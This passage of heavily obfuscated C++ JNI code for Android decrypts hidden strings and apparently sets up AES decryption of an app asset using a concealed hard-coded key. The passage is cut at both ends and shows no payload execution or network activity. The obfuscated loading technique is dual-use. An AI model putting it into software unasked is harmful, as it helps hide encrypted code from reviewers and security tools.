        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0x6e;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c ^= m;
        c += 0x8a;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c = -c;
        c -= m;
        c = -c;
        c ^= 0xe7;
        c = (c >> 0x5) | (c << 0x3);
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c -= m;
        c ^= m;
        c = -c;
        c -= m;
        c ^= 0x41;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xe0;
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = -c;
        c -= m;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xa1;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0xa2;
        c = -c;
        c ^= 0x10;
        c += 0x59;
        c = ~c;
        c = -c;
        c += m;
        c = -c;
        c -= m;
        c ^= m;
        c = ~c;
        c -= 0xf4;
        c = -c;
        c ^= 0x98;
        c += m;
        c ^= 0x45;
        c -= m;
        c = -c;
        c ^= 0xeb;
        c += 0x31;
        c ^= 0x45;
        c = ~c;
        c ^= m;
        c -= m;
        c = -c;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c += 0x92;
        c ^= 0x24;
        c += 0x13;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = ~c;
        c -= m;
        c = -c;
        c ^= m;
        c += 0x82;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= m;
        c = ~c;
        c ^= 0x8c;
        c -= m;
        c = -c;
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c += 0xc5;
        c = ~c;
        c -= 0x24;
        c = -c;
        c += m;
        c = (c >> 0x5) | (c << 0x3);
        c += 0xc2;
        c = -c;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c ^= m;
        c -= 0x25;
        c ^= m;
        c -= m;
        s3[m] = c;
    }
    // Array of XOR keys_17, one for each character
    const unsigned char keys_17[] = {
            0x1A, 0x2B, 0x3C, 0x4D
    };

    // Obfuscated string using different XOR keys_17
     const unsigned char obfuscated_17[] = {
            '(' ^ 0x1A, ')' ^ 0x2B, 'I' ^ 0x3C,
            '\0' ^ 0x4D
    };

    // Buffer to store the decrypted_17 string
     char decrypted_17[sizeof(obfuscated_17)];

    // Decrypt the string by XORing with the corresponding key
    for (size_t i = 0; i < sizeof(obfuscated_17); ++i) {
        decrypted_17[i] = obfuscated_17[i] ^ keys_17[i];
    }

    jmethodID availableMethod = (env)->GetMethodID(inputStreamClass, (char *) s2, decrypted_17);
    // Array of XOR keys_19, one for each character
    const unsigned char keys_19[] = {
            0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F
    };

    // Obfuscated string using different XOR keys_19
     const unsigned char obfuscated_19[] = {
            '(' ^ 0x1A, '[' ^ 0x2B, 'B' ^ 0x3C, ')' ^ 0x4D,
            'I' ^ 0x5E, '\0' ^ 0x6F
    };

    // Buffer to store the decrypted_19 string
     char decrypted_19[sizeof(obfuscated_19)];

    // Decrypt the string by XORing with the corresponding key
    for (size_t i = 0; i < sizeof(obfuscated_19); ++i) {
        decrypted_19[i] = obfuscated_19[i] ^ keys_19[i];
    }

    jmethodID readMethod = (env)->GetMethodID(inputStreamClass, (char *) s3, decrypted_19);
    unsigned char s4[] =
            {

                    0xcd, 0xc9, 0x5, 0x24, 0xb6, 0x92
            };

    for (unsigned int m = 0; m < sizeof(s4); ++m) {
        unsigned char c = s4[m];
        c = ~c;
        c += m;
        c = ~c;
        c -= 0xba;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x21;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xed;
        c = (c >> 0x2) | (c << 0x6);
        c += 0xd0;
        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c ^= m;
        c = -c;
        c ^= 0x93;
        c += 0x9e;
        c ^= m;
        c -= m;
        c ^= 0xf0;
        c -= 0x54;
        c ^= m;
        c -= m;
        c ^= m;
        c -= 0x1;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x83;
        c ^= 0x8e;
        c = ~c;
        c ^= 0x6d;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c += 0x19;
        c ^= 0x31;
        c = ~c;
        c -= 0xec;
        c ^= 0x47;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c ^= 0x93;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c += 0x47;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= 0xd1;
        c -= m;
        c = -c;
        c -= 0x70;
        c ^= 0x1f;
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c += 0xef;
        c = ~c;
        c -= 0xa4;
        c ^= m;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0xe;
        c ^= m;
        c += m;
        c ^= 0x9b;
        c += 0x4;
        c ^= 0xd6;
        c -= m;
        c ^= 0x6e;
        c = ~c;
        c ^= 0x9e;
        c = -c;
        c -= m;
        c ^= 0x8c;
        c = ~c;
        c = -c;
        c ^= m;
        c -= m;
        c = -c;
        c ^= 0x4e;
        c += 0xc7;
        c = -c;
        c -= 0xfc;
        c = ~c;
        c ^= 0xcb;
        c = -c;
        c = ~c;
        c -= 0x55;
        c ^= m;
        c = -c;
        c += m;
        c ^= m;
        c = ~c;
        c ^= 0x48;
        c = -c;
        c -= m;
        c ^= 0x69;
        c += 0x34;
        c ^= m;
        c = ~c;
        c = -c;
        c += m;
        c ^= 0x41;
        c += 0xbc;
        c ^= m;
        c -= m;
        c = ~c;
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c ^= m;
        c -= 0x8;
        c = -c;
        c += m;
        c = -c;
        c += m;
        c ^= m;
        c -= 0x5b;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0xe8;
        c ^= 0x6c;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = -c;
        c = ~c;
        c += m;
        c ^= 0x9e;
        c = (c >> 0x1) | (c << 0x7);
        c += m;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0x89;
        c -= m;
        c ^= 0x29;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c += 0x6f;
        c = ~c;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c ^= m;
        c += 0x4a;
        c = ~c;
        c += 0x77;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c += 0x86;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c ^= 0xc0;
        c += 0x50;
        c ^= 0x99;
        c = ~c;
        c += 0x75;
        c ^= 0xc5;
        c = ~c;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c ^= 0xa0;
        c -= m;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c += 0xcd;
        c ^= m;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0xb2;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0xa7;
        c = -c;
        c -= 0xdc;
        c ^= m;
        c = -c;
        c = ~c;
        c -= m;
        c = ~c;
        c = -c;
        c -= 0x52;
        c = ~c;
        c ^= 0x74;
        c += 0x85;
        c = ~c;
        c ^= m;
        c += m;
        c = ~c;
        c -= 0xf6;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c += 0xe8;
        c ^= m;
        c += 0x81;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c += m;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c += m;
        c ^= m;
        c -= m;
        c = ~c;
        c += m;
        c ^= m;
        c = ~c;
        c -= 0xf9;
        c = ~c;
        c -= 0xce;
        c ^= 0x5e;
        c = -c;
        c ^= m;
        c -= m;
        c = -c;
        c ^= m;
        c -= 0x78;
        c = -c;
        c -= m;
        c ^= 0xda;
        c += 0xf5;
        c ^= m;
        c += m;
        c ^= 0xb7;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c ^= 0xa;
        c = ~c;
        c += 0x8c;
        s4[m] = c;
    }
    unsigned char s5[] =
            {

                    0xbe, 0x20, 0xc2, 0xcb
            };

    for (unsigned int m = 0; m < sizeof(s5); ++m) {
        unsigned char c = s5[m];
        c = (c >> 0x7) | (c << 0x1);
        c -= 0x24;
        c ^= 0xbb;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c -= m;
        c = ~c;
        c ^= 0x9a;
        c = -c;
        c = ~c;
        c ^= 0xbf;
        c = -c;
        c = ~c;
        c -= 0x55;
        c = ~c;
        c -= 0x9;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c ^= 0xb8;
        c += m;
        c ^= m;
        c -= 0xdd;
        c ^= m;
        c += 0xd;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = -c;
        c += 0xc9;
        c = ~c;
        c ^= 0x1a;
        c += 0xdc;
        c ^= m;
        c -= m;
        c ^= 0x47;
        c -= 0x14;
        c = (c >> 0x1) | (c << 0x7);
        c -= 0x47;
        c = -c;
        c = ~c;
        c -= m;
        c = ~c;
        c ^= 0x54;
        c += 0xcc;
        c = ~c;
        c += m;
        c = ~c;
        c = -c;
        c ^= 0xf3;
        c = ~c;
        c ^= 0x90;
        c += 0xab;
        c = -c;
        c ^= m;
        c += 0x84;
        c ^= 0x87;
        c -= 0xeb;
        c ^= m;
        c -= m;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c += m;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c = -c;
        c ^= m;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= 0x9e;
        c ^= m;
        c -= 0x5e;
        c ^= m;
        c -= 0x4b;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c ^= 0xa8;
        c -= 0xf9;
        c = -c;
        c = ~c;
        c += m;
        c = -c;
        c ^= 0x14;
        c = ~c;
        c = -c;
        c += m;
        c = ~c;
        c = -c;
        c = ~c;
        c ^= 0xc1;
        c -= m;
        c = -c;
        c ^= 0x6f;
        c -= m;
        c = -c;
        c ^= m;
        c = -c;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x7a;
        c -= m;
        c ^= m;
        c += m;
        c ^= 0x1a;
        c = -c;
        c ^= m;
        c -= m;
        c = ~c;
        c ^= 0x55;
        c += 0x49;
        c ^= m;
        c = ~c;
        c += 0xe6;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c ^= m;
        c = -c;
        c += m;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = ~c;
        c ^= 0x7;
        c += 0x36;
        c = -c;
        c += m;
        c = -c;
        c += 0xeb;
        c = -c;
        c ^= m;
        c += 0x98;
        c = (c >> 0x6) | (c << 0x2);
        c ^= m;
        c = ~c;
        c ^= m;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c = ~c;
        c ^= 0x82;
        c += 0x48;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c ^= m;
        c = -c;
        c -= 0x59;
        c = (c >> 0x7) | (c << 0x1);
        c += m;
        c = -c;
        c ^= 0x9c;
        c += m;
        c = -c;
        c += 0xed;
        c = -c;
        c += m;
        c ^= 0x85;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0x72;
        c ^= m;
        c += 0x9b;
        c = -c;
        c += m;
        c ^= m;
        c += 0xdd;
        c = -c;
        c += 0x13;
        c ^= 0x7c;
        c -= m;
        c = -c;
        c += m;
        c = ~c;
        c += m;
        c = -c;
        c ^= m;
        c -= 0x4e;
        c = ~c;
        c -= 0x2e;
        c = ~c;
        c -= m;
        c = ~c;
        c -= 0x60;
        c ^= 0x7b;
        c += m;
        c ^= 0x9d;
        c += m;
        c = ~c;
        c += 0x2c;
        c = -c;
        c ^= m;
        c += 0x85;
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x5e;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c ^= m;
        c -= 0x28;
        c = -c;
        c ^= 0xfd;
        c -= m;
        c ^= m;
        c = -c;
        c += m;
        c = ~c;
        c += m;
        c = -c;
        c ^= m;
        c -= m;
        c ^= 0x97;
        c = -c;
        c ^= m;
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c ^= m;
        c = -c;
        c += m;
        c ^= 0x38;
        c -= m;
        c = ~c;
        c -= m;
        c ^= 0x58;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = -c;
        c += m;
        c = -c;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c ^= 0x61;
        c = ~c;
        c += m;
        c ^= 0x8c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0xcf;
        c = -c;
        c -= m;
        c ^= m;
        c += m;
        c = ~c;
        c = -c;
        c ^= 0x99;
        c = ~c;
        c -= m;
        s5[m] = c;
    }

    jmethodID closeMethod = (env)->GetMethodID(inputStreamClass, (char *) s4, (char *) s5);

// Get the size of the InputStream
    jint size = (env)->CallIntMethod(inputStream, availableMethod);
    jbyteArray buffer = (env)->NewByteArray(size);

// Read the InputStream into the buffer
    (env)->CallIntMethod(inputStream, readMethod, buffer);

// Close the InputStream
    (env)->CallVoidMethod(inputStream, closeMethod);

// Clean up local references
    (env)->DeleteLocalRef(fileName);
    (env)->DeleteLocalRef(inputStream);
    (env)->DeleteLocalRef(assetManager);
    (env)->DeleteLocalRef(assetManagerClass);
    (env)->DeleteLocalRef(inputStreamClass);
    (env)->DeleteLocalRef(contextClass);

    jclass secretKeySpecClass_d_1, cipherClass_d_1;
    jmethodID secretKeySpecConstructor__d_1, cipherGetInstance__d_1, cipherInit__d_1, cipherDoFinal_d_1;
    jobject secretKeySpec_d_1, cipher_d_1;
    jbyteArray keyArray_d_1, result_d_1;
    jstring transformation_d_1;

    unsigned char sd1[] =
            {

                    0x83, 0x6c, 0x44, 0x3d, 0x5f, 0x2e, 0x66, 0xe4,
                    0xd8, 0x24, 0x7c, 0xa2, 0x23, 0xea, 0x90, 0xa2,
                    0xc0
            };

    for (unsigned int m = 0; m < sizeof(sd1); ++m) {
        unsigned char c = sd1[m];
        c = (c >> 0x1) | (c << 0x7);
        c += 0xf1;
        c ^= 0x56;
        c -= m;
        c ^= 0xf0;
        c -= 0xb5;
        c ^= 0xa;
        c -= m;
        c = ~c;
        c = -c;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c += m;
        c ^= 0x1c;
        c += m;
        c ^= 0x51;
        c += m;
        c ^= 0x8d;
        c += m;
        c = ~c;
        c += 0xcd;
        c = -c;
        c ^= 0xe3;
        c -= 0x2;
        c = -c;
        c -= m;
        c ^= 0xec;
        c += m;
        c ^= m;
        c -= m;
        c = (c >> 0x6) | (c << 0x2);
        c -= 0x4d;
        c ^= m;
        c -= 0xf0;
        c ^= 0x7a;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c -= 0xdf;
        c = -c;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c = -c;
        c += 0x69;
        c ^= m;
        c += 0x2b;
        c = (c >> 0x1) | (c << 0x7);
        c ^= 0x7;
        c = ~c;
        c = (c >> 0x7) | (c << 0x1);
        c = -c;
        c -= 0x72;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x22;
        c = -c;
        c = ~c;
        c ^= m;
        c = -c;
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c -= m;
        c = ~c;
        c -= m;
        c = ~c;
        c -= 0x4e;
        c = ~c;
        c ^= 0x85;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = -c;
        c ^= 0xcb;
        c -= m;
        c ^= 0x86;
        c += m;
        c = -c;
        c += m;
        c = ~c;
        c -= 0x9e;
        c = (c >> 0x3) | (c << 0x5);
        c -= m;
        c ^= 0xac;
        c += 0xc3;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = ~c;
        c = -c;
        c ^= m;
        c -= m;
        c = -c;
        c -= m;
        c ^= 0x33;
        c = (c >> 0x6) | (c << 0x2);
        c -= m;
        c = ~c;
        c += m;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0x44;
        c = ~c;
        c -= 0xd0;
        c = -c;
        c = ~c;
        c ^= 0x7a;
        c += m;
        c ^= 0x8f;
        c += m;
        c ^= 0x97;
        c -= m;
        c ^= 0xb;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += 0x6b;
        c ^= 0xb6;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c += m;
        c = ~c;
        c += 0xf7;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c -= 0x41;
        c = -c;
        c -= m;
        c = (c >> 0x3) | (c << 0x5);
        c ^= m;
        c += 0xf6;
        c = -c;
        c ^= 0x71;
        c += m;
        c = ~c;
        c += 0xf3;
        c ^= 0xa5;
        c = ~c;
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c += 0xe8;
        c = ~c;
        c ^= 0x24;
        c += m;
        c = ~c;
        c -= 0x96;
        c ^= m;
        c -= m;
        c ^= m;
        c += 0x75;
        c = ~c;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c -= m;
        c = ~c;
        c += 0x51;
        c = ~c;
        c -= 0xfe;
        c ^= m;
        c += m;
        c ^= m;
        c = ~c;
        c += m;
        c ^= 0xde;
        c = (c >> 0x3) | (c << 0x5);
        c += 0x5b;
        c = ~c;
        c ^= m;
        c += m;
        c ^= m;
        c = -c;
        c ^= 0x61;
        c = -c;
        c -= 0xeb;
        c = (c >> 0x2) | (c << 0x6);
        c ^= 0x9a;
        c -= 0x1d;
        c = -c;
        c = ~c;
        c -= 0xee;
        c = -c;
        c ^= m;
        c -= m;
        c = ~c;
        c -= 0xce;
        c = ~c;
        c = -c;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c -= 0x52;
        c = (c >> 0x2) | (c << 0x6);
        c += m;
        c = ~c;
        c ^= 0x1a;
        c += m;
        c ^= m;
        c = -c;
        c ^= m;
        c -= m;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x3b;
        c = -c;
        c -= m;
        c ^= m;
        c = -c;
        c ^= m;
        c -= m;
        c = ~c;
        c -= 0xf7;
        c ^= 0xb4;
        c += m;
        c ^= 0x56;
        c -= 0x72;
        c = -c;
        c ^= 0x4a;
        c = ~c;
        c -= 0x23;
        c = -c;
        c ^= 0x3c;
        c += 0x89;
        c ^= 0xc;
        c += m;
        c ^= 0x4b;
        c = (c >> 0x2) | (c << 0x6);
        c -= 0xb2;
        c ^= m;
        c += m;
        c ^= 0x26;
        c -= m;
        c ^= m;
        c = -c;
        c += m;
        c = -c;
        c = ~c;
        c -= 0x8c;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = ~c;
        c -= 0x60;
        c ^= 0xa6;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0x38;
        c ^= 0x14;
        c = (c >> 0x3) | (c << 0x5);
        c += 0xd8;
        c = -c;
        c ^= m;
        c += m;
        c ^= m;
        c = ~c;
        c -= m;
        sd1[m] = c;
    }

    const char *key_d_1 = reinterpret_cast<const char *>(sd1);
    const int keyLength_d_2 = 16;

    // Convert the key_d_1 to a Java byte array
    keyArray_d_1 = env->NewByteArray(keyLength_d_2);
    env->SetByteArrayRegion(keyArray_d_1, 0, keyLength_d_2, (const jbyte *) key_d_1);
    unsigned char ss3s[] =
            {

                    0x13, 0xff, 0x6b, 0xeb, 0x58, 0x3, 0x4e, 0x32,
                    0xf, 0x9b, 0xd, 0x6d, 0x3b, 0xd4, 0x5f, 0x52,
                    0xc5, 0xe6, 0xc0, 0x29, 0x94, 0x78, 0x8, 0xed,
                    0x7a, 0xe1, 0x33, 0xda, 0x35, 0x20, 0x1b, 0xfd
            };

    for (unsigned int m = 0; m < sizeof(ss3s); ++m)
    {
        unsigned char c = ss3s[m];
        c -= m;
        c ^= m;
        c = ~c;
        c ^= m;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c -= m;
        c = (c >> 0x2) | (c << 0x6);
        c += 0xf;
        c = (c >> 0x3) | (c << 0x5);
        c = ~c;
        c -= 0x73;
        c = ~c;
        c += m;
        c = ~c;
        c -= 0x54;
        c ^= 0x9b;
        c = ~c;
        c ^= 0x8d;
        c = (c >> 0x1) | (c << 0x7);
        c += 0x39;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c = ~c;
        c += 0x70;
        c = ~c;
        c = -c;
        c -= m;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        ss3s[m] = c;
    }

    // Get the SecretKeySpec class and its constructor
    secretKeySpecClass_d_1 = env->FindClass((char*)ss3s);
    unsigned char sd6[] =
            {

                    0x5, 0xe4, 0x43, 0x8a, 0x72, 0x34, 0xc3, 0xa4,
                    0xcc, 0xda, 0x8c, 0xda, 0x6c, 0x8e, 0xc9, 0xeb,
                    0x54, 0x14, 0x24, 0xb2, 0x4c, 0xf3, 0x43, 0x16
            };

    for (unsigned int m = 0; m < sizeof(sd6); ++m) {
        unsigned char c = sd6[m];
        c = -c;
        c -= 0xf6;
        c = -c;
        c ^= 0x4b;
        c = -c;
        c -= 0xdd;
        c = (c >> 0x3) | (c << 0x5);
        c += m;
        c ^= 0xb;
        c += 0x58;
        c = ~c;
        c += m;
        c ^= 0x2e;
        c -= 0xf5;
        c = -c;
        c ^= 0x60;
        c += 0x41;
        c = ~c;
        c -= m;
        c ^= 0xfd;
        sd6[m] = c;
    }
    // Array of XOR keys_33, one for each character
    const unsigned char keys_33[] = {
            0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x7A
    };

    // Obfuscated string using different XOR keys_33
     const unsigned char obfuscated_33[] = {
            '<' ^ 0x1A, 'i' ^ 0x2B, 'n' ^ 0x3C, 'i' ^ 0x4D,
            't' ^ 0x5E, '>' ^ 0x6F, '\0' ^ 0x7A
    };

    // Buffer to store the decrypted_33 string
     char decrypted_33[sizeof(obfuscated_33)];

    // Decrypt the string by XORing with the corresponding key
    for (size_t i = 0; i < sizeof(obfuscated_33); ++i) {
        decrypted_33[i] = obfuscated_33[i] ^ keys_33[i];
    }

    secretKeySpecConstructor__d_1 = env->GetMethodID(secretKeySpecClass_d_1, decrypted_33,
                                                     (char *) sd6);
    unsigned char sd2[] =
            {

                    0x34, 0xee, 0xd9, 0xdb
            };

    for (unsigned int m = 0; m < sizeof(sd2); ++m) {
        unsigned char c = sd2[m];
        c ^= 0xf4;
        c += 0x7;
        c = (c >> 0x2) | (c << 0x6);
        c += 0x4c;
        c = (c >> 0x5) | (c << 0x3);
        c ^= m;
        c -= 0x6b;
        c ^= 0x1e;
        c += m;
        c ^= m;
        c -= 0x91;
        c = (c >> 0x2) | (c << 0x6);
        c = -c;
        c = (c >> 0x3) | (c << 0x5);
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c = (c >> 0x1) | (c << 0x7);
        sd2[m] = c;
    }

    // Create a SecretKeySpec object
    jstring aesString_d_3 = env->NewStringUTF((char *) sd2);
    secretKeySpec_d_1 = env->NewObject(secretKeySpecClass_d_1, secretKeySpecConstructor__d_1,
                                       keyArray_d_1,
                                       aesString_d_3);

    unsigned char ss4s[] =
            {

                    0xeb, 0xe2, 0x20, 0x49, 0x21, 0x25, 0xd0, 0x2e,
                    0xcd, 0x4a, 0x85, 0x71, 0x15, 0xd7, 0x38, 0x94,
                    0x2c, 0xa9, 0x27, 0x3b
            };

    for (unsigned int m = 0; m < sizeof(ss4s); ++m)
    {
        unsigned char c = ss4s[m];
        c ^= 0xfd;
        c += m;
        c = (c >> 0x2) | (c << 0x6);
        c -= m;
        c = -c;
        c = ~c;
        c = -c;
        c += m;
        c = ~c;
        c -= m;
        c ^= 0x11;
        c = ~c;
        c ^= 0x18;
        c += 0x81;
        c ^= m;
        c -= m;
        c = -c;
        c ^= m;
        c = ~c;
        c ^= m;
        c -= 0xe;
        c ^= 0x8e;
        c = (c >> 0x5) | (c << 0x3);
        c -= m;
        c = ~c;
        c ^= m;
        c = (c >> 0x7) | (c << 0x1);
        c ^= m;
        c = ~c;
        c = -c;
        ss4s[m] = c;
    }


    // Get the Cipher class and its methods
    cipherClass_d_1 = env->FindClass((char*) ss4s);
    unsigned char ss5s[] =
            {

                    0x76, 0x91, 0x8, 0xf3, 0x63, 0x3, 0x90, 0x38,
                    0x1c, 0x7b, 0x70, 0xa1
            };

    for (unsigned int m = 0; m < sizeof(ss5s); ++m)
    {
        unsigned char c = ss5s[m];
        c -= 0xf7;
        c = ~c;
        c = (c >> 0x2) | (c << 0x6);
        c ^= m;
        c += m;
        c = ~c;
        c = -c;
        c = (c >> 0x1) | (c << 0x7);
        c = ~c;
        c = -c;
        c -= m;
        c = ~c;
        c -= m;
        c ^= m;
        c = (c >> 0x1) | (c << 0x7);
        c -= m;
        c = (c >> 0x7) | (c << 0x1);
        c = ~c;
        c += m;
        c = ~c;
        c = (c >> 0x6) | (c << 0x2);
        c += m;
        c = (c >> 0x1) | (c << 0x7);
        c = -c;
        c += 0xc8;
        c = (c >> 0x5) | (c << 0x3);
        c += m;
        c = ~c;
        c += m;
        c = ~c;
        ss5s[m] = c;
    }

    unsigned char sd3[] =
            {

                    0xf5, 0x59, 0x37, 0x6c, 0x3, 0x34, 0x4, 0x3d,
                    0x72, 0x8b, 0x44, 0xf6, 0x5c, 0x1, 0x47, 0x4c,
                    0x7b, 0x7a, 0x68, 0x74, 0x19, 0xbf, 0x1a, 0x83,
                    0x52, 0x75, 0x7c, 0x1a, 0x87, 0xbc, 0x89, 0x85,
                    0x78, 0xc2, 0x50, 0x34, 0x85, 0x3d, 0x66, 0x87,
                    0x54, 0xd
            };

    for (unsigned int m = 0; m < sizeof(sd3); ++m) {
        unsigned char c = sd3[m];
        c = ~c;
        c = (c >> 0x5) | (c << 0x3);
        c = ~c;
        c ^= 0x13;
        c = (c >> 0x3) | (c << 0x5);
        c -= 0x24;
        c ^= 0xe8;
        c -= 0xbb;
        c ^= m;
        c += 0x70;
        c ^= 0x20;
        c = ~c;
        c ^= m;
        c -= 0xba;
        c ^= 0x75;
        c = ~c;
        c += m;
        c = -c;
        c ^= m;
        c += 0x87;
        sd3[m] = c;
    }
    const unsigned char keys_29[] = {
            0x1A, 0x2B, 0x3C, 0x4D, 0x5E
    };

    // Obfuscated string using different XOR keys_29
     const unsigned char obfuscated_29[] = {
            'i' ^ 0x1A, 'n' ^ 0x2B, 'i' ^ 0x3C, 't' ^ 0x4D,
            '\0' ^ 0x5E
    };

    // Buffer to store the decrypted_29 string
     char decrypted_29[sizeof(obfuscated_29)];

    // Decrypt the string by XORing with the corresponding key
    for (size_t i = 0; i < sizeof(obfuscated_29); ++i) {
        decrypted_29[i] = obfuscated_29[i] ^ keys_29[i];
    }

    cipherGetInstance__d_1 = env->GetStaticMethodID(cipherClass_d_1, (char *)ss5s, (char *) sd3);
    unsigned char sd4[] =
            {

                    0x40, 0xfd, 0x15, 0xd8, 0xc7, 0x5c, 0xc5, 0x29,
                    0xdf, 0xba, 0xbd, 0xd5, 0xda, 0xcc, 0x55, 0xea,
                    0x1e, 0x5, 0xaf, 0xe5, 0x5d, 0x41, 0xa3, 0x73
            };

    for (unsigned int m = 0; m < sizeof(sd4); ++m) {
        unsigned char c = sd4[m];
        c += m;
        c = ~c;
        c = -c;
        c -= 0xff;
        c = (c >> 0x5) | (c << 0x3);
        c -= 0xb2;
        c = -c;
        c ^= m;
        c -= m;
        c = -c;
        c += m;
        c = ~c;
        c ^= m;
        c = ~c;
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c += 0x18;
        c = -c;
        c = (c >> 0x7) | (c << 0x1);
        c ^= 0xef;
        sd4[m] = c;
    }

    cipherInit__d_1 = env->GetMethodID(cipherClass_d_1, decrypted_29, (char *) sd4);

    unsigned char ss6s[] =
            {

                    0xfc, 0xfe, 0x8f, 0x8e, 0xbe, 0x41, 0xd1, 0x5a
            };

    for (unsigned int m = 0; m < sizeof(ss6s); ++m)
    {
        unsigned char c = ss6s[m];
        c = ~c;
        c += m;
        c = ~c;
        c ^= m;
        c -= 0x82;
        c ^= 0xec;
        c -= 0xe0;
        c = (c >> 0x2) | (c << 0x6);
        c = ~c;
        c += 0xdb;
        c ^= 0x70;
        c = (c >> 0x5) | (c << 0x3);
        c = -c;
        c = (c >> 0x5) | (c << 0x3);
        c = ~c;
        c -= 0x4;
        c ^= 0x86;
        c -= m;
        c ^= 0x1d;
        c += m;
        c = (c >> 0x7) | (c << 0x1);
